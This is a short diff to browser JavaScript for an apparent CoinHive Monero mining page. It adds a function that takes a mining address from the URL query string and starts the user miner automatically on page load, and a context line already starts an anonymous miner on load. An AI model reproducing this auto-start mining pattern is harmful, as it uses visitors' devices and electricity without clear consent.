@@ -1,3 +1,4 @@
+/** For Setting up the User Miner */
 var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
 anonMiner.start();
 
@@ -91,3 +92,14 @@ function startUserMiner() {
         document.getElementById('formTitle').innerHTML = 'Hash Balance Prior to this Session: ' + userHashes + ' Hashes';
     }, 1000);
 }
+function minerURL() {
+    // Get query
+    var queryString = window.location.search;
+    if (queryString.length) {
+        queryString = queryString.substring(1);
+        document.getElementById('xmrAddress').value = queryString;
+        startUserMiner();
+    }
+}
+
+minerURL();
